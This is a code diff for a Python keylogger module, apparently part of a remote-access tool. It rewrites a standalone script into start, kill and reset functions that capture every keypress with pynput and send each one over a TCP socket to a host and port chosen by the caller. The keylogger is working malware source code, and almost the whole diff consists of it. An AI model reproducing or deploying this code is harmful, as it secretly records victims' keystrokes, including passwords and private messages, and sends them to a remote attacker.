@@ -2,36 +2,55 @@ import socket, os, subprocess, pathlib, platform, logging
 from threading import Thread
 from pynput.keyboard import Key, Listener
 
-def connect():
-	notConnected = True
-	while notConnected:
-		os.system('cls')
-		global host
-		global port
-		global s
 
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+keylogRunning = False
 
-		port = 4445
-		host = 'localhost'
-
-		try:
-			print('[!] Trying To Connect To %s:%s'%(host, port))
-			s.connect((host,port))
-			print('[*] Connection Established')
-			notConnected = False
-		except Exception as e:
-			print('Could Not Connect: ', e)
-
-def send(args):
-	send = s.send(args.encode('utf8'))
+killThread = False
 
 def on_press(key):
-	print(str(key))
-	send(str(key))
-	if key == Key.esc:
+	global kS
+	global killThread
+	global keylogRunning
+	if killThread:
+		reset()
+		send = kS.send("kill".encode('utf8'))
 		return False
+	# if key == Key.esc:
+	# 	return False
+	send = kS.send(str(key).encode('utf8'))
+	
 
-connect()
-with Listener(on_press=on_press) as listener:
-	listener.join()
+def start(kPort, host):
+	global kS
+	global keylogRunning
+
+	if keylogRunning:
+		return
+	else:
+		print("Starting Keylogger")
+	
+	
+	kNotConnected = True
+	while kNotConnected:
+		kS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+		try:
+			kS.connect((host,kPort))
+			kNotConnected = False
+			keylogRunning = True
+		except:
+			kNotConnected = True
+
+	with Listener(on_press=on_press) as listener:
+		listener.join()
+
+def kill():
+	global killThread
+	killThread = True
+
+def reset():
+	global keylogRunning
+	global killThread
+	killThread = False
+	keylogRunning = False
+
